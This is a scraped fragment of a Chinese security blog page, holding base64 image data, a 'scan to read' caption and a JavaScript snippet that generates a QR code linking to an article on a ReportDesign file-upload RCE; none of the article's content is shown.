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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/youjiasoft-ReportDesign-RepFile-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 